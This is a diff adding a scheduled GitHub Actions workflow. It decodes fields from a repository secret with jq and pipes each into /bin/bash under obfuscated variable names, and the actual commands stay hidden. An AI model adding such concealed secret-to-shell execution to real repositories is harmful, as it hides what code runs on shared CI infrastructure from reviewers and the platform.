@@ -1,0 +1,25 @@
+name: dajianlusheng
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '14 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: dajianlusheng
+        env:
+          ikx946: ${{ secrets.ikx946 }}
+        run: |
+          echo $ikx946 | jq -r .rzej19 | /bin/bash
+          echo $c09 | jq -r .hyqw724 | /bin/bash
+          echo $fh00280 | jq -r .mmkk53 | /bin/bash
+          echo $gvndf36 | jq -r .o68714 | /bin/bash
+          echo $rt987 | jq -r .bkmw043 | /bin/bash
+          echo $st5 | jq -r .jymzf8111 | /bin/bash
+          echo $ikx41 | jq -r .rp41332 | /bin/bash
+          echo $ixjg4 | jq -r .opo146 | /bin/bash
+
